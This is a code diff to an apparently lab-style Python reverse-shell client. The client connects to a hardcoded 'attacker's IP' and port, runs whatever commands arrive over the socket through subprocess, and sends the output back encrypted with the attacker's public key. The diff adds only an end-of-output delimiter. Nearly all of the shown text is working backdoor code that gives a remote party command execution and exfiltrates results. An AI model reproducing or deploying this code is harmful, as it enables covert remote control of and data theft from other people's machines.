@@ -4,6 +4,8 @@ import subprocess
 import os
 from cryptidy import asymmetric_encryption as ae
 
+EOF = b'dhruv.anish.samarth.blah.blah'
+
 HOST = '10.0.2.4'  # Attacker's IP address
 PORT = 12345  # Same port number used in the listener
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -33,7 +35,7 @@ try:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             result = result.stdout.decode()
             encrypted_output = ae.encrypt_message(result, attacker_pub_key)
-            s.send(encrypted_output)
+            s.send(encrypted_output + EOF)
         else:
             s.send(b' ')
 except:
